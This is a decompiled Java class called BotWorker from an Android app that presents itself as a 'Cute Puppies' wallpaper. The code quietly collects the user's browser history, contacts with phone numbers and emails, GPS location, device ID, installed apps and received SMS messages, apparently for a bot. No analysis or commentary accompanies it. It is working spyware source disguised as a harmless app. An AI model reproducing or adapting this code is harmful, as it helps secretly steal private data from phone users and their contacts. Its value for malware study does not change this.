// 
// Decompiled by Procyon v0.5.30
// 

package com.adam.CutePuppiesWallpaper;

import java.util.Collection;
import java.util.Iterator;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.location.Location;
import android.util.Log;
import android.provider.ContactsContract$CommonDataKinds$Email;
import android.provider.ContactsContract$CommonDataKinds$Phone;
import android.provider.ContactsContract$Contacts;
import java.util.ArrayList;
import java.util.Hashtable;
import android.database.Cursor;
import android.provider.Browser;
import java.util.LinkedList;
import java.util.List;
import android.content.Context;
import android.content.ContentResolver;

public class BotWorker
{
    public static final String LOG_TAG = "MCS_BOT_BotWorker";
    private ContentResolver cr;
    private Context ctx;
    
    public BotWorker(final ContentResolver cr, final Context ctx) {
        this.cr = cr;
        this.ctx = ctx;
        BotSMSHandler.Initialize();
        BotLocationHandler.Initialize(ctx);
    }
    
    public List<String> GetBrowserHistory() {
        final LinkedList<String> list = new LinkedList<String>();
        final Cursor allVisitedUrls = Browser.getAllVisitedUrls(this.cr);
        allVisitedUrls.moveToFirst();
        if (allVisitedUrls.getCount() > 0) {
            while (allVisitedUrls.moveToNext()) {
                list.add(allVisitedUrls.getString(0));
            }
        }
        return list;
    }
    
    public Hashtable<String, ArrayList<String>> GetContactInfo() {
        final Hashtable<String, ArrayList<String>> hashtable = new Hashtable<String, ArrayList<String>>();
        final Cursor query = this.cr.query(ContactsContract$Contacts.CONTENT_URI, (String[])null, (String)null, (String[])null, (String)null);
        if (query.getCount() > 0) {
            while (query.moveToNext()) {
                final ArrayList<String> value = new ArrayList<String>();
                final String string = query.getString(query.getColumnIndex("_id"));
                final String string2 = query.getString(query.getColumnIndex("display_name"));
                String string3 = "";
                if (Integer.parseInt(query.getString(query.getColumnIndex("has_phone_number"))) > 0) {
                    final Cursor query2 = this.cr.query(ContactsContract$CommonDataKinds$Phone.CONTENT_URI, (String[])null, "contact_id = ?", new String[] { string }, (String)null);
                    query2.moveToFirst();
                    string3 = string3;
                    if (query2.getCount() > 0) {
                        string3 = query2.getString(query2.getColumnIndex("data1"));
                    }
                    query2.close();
                }
                String string4 = "";
                final Cursor query3 = this.cr.query(ContactsContract$CommonDataKinds$Email.CONTENT_URI, (String[])null, "contact_id = ?", new String[] { string }, (String)null);
                query3.moveToFirst();
                if (query3.getCount() > 0) {
                    string4 = query3.getString(query3.getColumnIndex("data1"));
                }
                query3.close();
                value.add(string2);
                value.add(string3);
                value.add(string4);
                hashtable.put(string, value);
            }
        }
        return hashtable;
    }
    
    public ArrayList<String> GetCurrentLocation() {
        final ArrayList<String> list = new ArrayList<String>();
        final Location getLastLocation = BotLocationHandler.GetLastLocation();
        try {
            final String string = Double.toString(getLastLocation.getLongitude());
            final String string2 = Double.toString(getLastLocation.getLatitude());
            final String string3 = Double.toString(getLastLocation.getAltitude());
            list.add(string);
            list.add(string2);
            list.add(string3);
            return list;
        }
        catch (NullPointerException ex) {
            Log.v("MCS_BOT_BotWorker", "No Location Found");
            return list;
        }
    }
    
    public String GetDeviceID() {
        return ((TelephonyManager)this.ctx.getSystemService("phone")).getDeviceId();
    }
    
    public ArrayList<String> GetPackagesInstalled() {
        final ArrayList<String> list = new ArrayList<String>();
        final PackageManager packageManager = this.ctx.getPackageManager();
        final Intent intent = new Intent("android.intent.action.MAIN", (Uri)null);
        intent.addCategory("android.intent.category.LAUNCHER");
        final Iterator iterator = packageManager.queryIntentActivities(intent, 0).iterator();
        while (iterator.hasNext()) {
            list.add(iterator.next().activityInfo.applicationInfo.loadLabel(packageManager).toString());
        }
        return list;
    }
    
    public List<String> GetReceivedSMS() {
        final ArrayList<Object> list = (ArrayList<Object>)new ArrayList<String>();
        list.addAll(BotSMSHandler.GetMessages());
        return (List<String>)list;
    }
    
    public Hashtable<String, String> ReadContacts() {
        final Hashtable<String, String> hashtable = new Hashtable<String, String>();
        final Cursor query = this.cr.query(ContactsContract$Contacts.CONTENT_URI, (String[])null, (String)null, (String[])null, (String)null);
        if (query.getCount() > 0) {
            while (query.moveToNext()) {
                hashtable.put(query.getString(query.getColumnIndex("_id")), query.getString(query.getColumnIndex("display_name")));
            }
        }
        return hashtable;
    }
}
